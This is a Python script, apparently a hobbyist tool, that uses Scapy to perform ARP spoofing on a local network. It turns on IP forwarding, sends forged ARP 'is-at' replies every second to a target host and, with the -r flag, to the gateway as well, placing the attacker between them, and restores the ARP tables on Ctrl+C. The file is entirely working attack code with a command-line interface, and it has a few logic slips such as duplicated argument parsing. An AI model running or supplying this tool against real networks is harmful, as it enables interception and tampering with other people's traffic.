from scapy.all import Ether, ARP, srp, send, sniff
import time
import sys

def enable_linux_iproute():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)

def enable_ip_route(verbose=True):
    #Enables IP forwarding..
    if verbose:
            print("Enabling IP Routing!...")
            enable_linux_iproute()
    if verbose:
            print("IP Routing Enabled!")

def get_mac_address(ip):
    #Returns MAC address of ANY device connected to the network
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip),timeout=3,verbose=0)
    if ans:
        return ans[0][1].src

def spoof(target_ip,host_ip, verbose=True):
    target_mac_address = get_mac_address(target_ip)
    #now to craft the response, We'll need the 'is-at' op code in the packet (response)
    #we don't care about hwsrc (hardware source MAC address)
    #By default the hwsrc (hardware source) is the address of the sender (us)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac_address,psrc=host_ip,op='is-at')
    #Now to send the packet
    send(arp_response,verbose=1)
    if verbose:
        self_mac = ARP().hwsrc
        print("[+++]\nSent to {} : {} is-at {}  \n[+++]".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip, verbose=True):
    target_mac = get_mac_address(target_ip)
    #Get the real MAC address of spoofed (gateway)
    host_mac = get_mac_address(host_ip)
    #crafting the restoring packet
    arp_response = ARP(pdst=target_ip,hwdst=target_mac,psrc=host_ip,hwsrc=host_mac,op="is-at")
    #Now to send the packet to restore the network
    send(arp_response,verbose=1,count=6)#sent 6 times just for good measure
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))


def myARP():
    # print(f"Args: {sys.argv}")
    if sys.argv != 1:
        for i in range(len(sys.argv)):
            r_flag = False
            host = '127.0.0.1'
            argument = sys.argv[i]
            if argument == sys.argv[0]:
                # print("Skipping filename")
                continue
            if argument[0] == '-':
                match argument:
                    case "-t": 
                        # print(f"target flag, next: {sys.argv[i + 1]}")
                        target = sys.argv[i + 1]
                        i += 1
                    case "-r": 
                        # print(f"recurse flag, next: {sys.argv[i + 1]}")
                        r_flag = True
                        host = sys.argv[i + 1]
                        i += 1
                    case _:
                        print("Unrecognized flag (only accepts -r and -t)")
        while True:
            try:
                if not r_flag:
                    spoof(target, host, 1)
                else:
                    spoof(target, host, 1)
                    spoof(host, target, 1)
                time.sleep(1)
            except KeyboardInterrupt:
                print("[!] Detected CTRL+C ! restoring the network, please wait...")
                restore(target, host)
                restore(host, target)


if __name__ == "__main__":
    enable_ip_route()
    # print(f"Args: {sys.argv}")
    if sys.argv != 1:
        r_flag = False
        host = '127.0.0.1'
        for i in range(len(sys.argv)):
            argument = sys.argv[i]
            if argument == sys.argv[0]:
                # print("Skipping filename")
                continue
            if argument[0] == '-':
                match argument:
                    case "-t": 
                        # print(f"target flag, next: {sys.argv[i + 1]}")
                        target = sys.argv[i + 1]
                        i += 1
                    case "-r": 
                        print(f"recurse flag, next: {sys.argv[i + 1]}")
                        r_flag = True
                        host = sys.argv[i + 1]
                        i += 1
                    case _:
                        print("Unrecognized flag (only accepts -r and -t)")
        print(f"Spoofing target: {target} host: {host}")
        while True:
            try:
                if not r_flag:
                    spoof(target, host, 1)
                else:
                    spoof(target, host, 1)
                    spoof(host, target, 1)
                time.sleep(1)
            except KeyboardInterrupt:
                print("[!] Detected CTRL+C ! restoring the network, please wait...")
                restore(target, host)
                restore(host, target)
                print("[!] Network restored")